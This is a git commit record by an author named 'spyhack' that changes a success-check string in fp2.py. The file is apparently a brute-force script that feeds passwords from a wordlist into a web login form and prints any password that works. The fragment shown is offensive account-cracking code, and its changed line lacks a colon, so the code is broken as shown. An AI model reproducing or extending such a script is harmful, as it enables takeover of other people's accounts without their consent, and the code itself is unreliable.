c88117fa952a5f04153590dbe6270763e9c8d113
spyhack <112711360+vicky3690@users.noreply.github.com>
2023-07-04 02:55:48 +0545

    Update fp2.py

--- fp2.py
+++ fp2.py
@@ -47,7 +47,7 @@ while file:
 			browser.form['pass'] = passw
 			response = browser.submit()
 			response_data = response.read()
-			if 'MPIN' in response_data 
+			if 'password' in response_data 
 				print('Your password is : ',passw)
 				break
 	except:
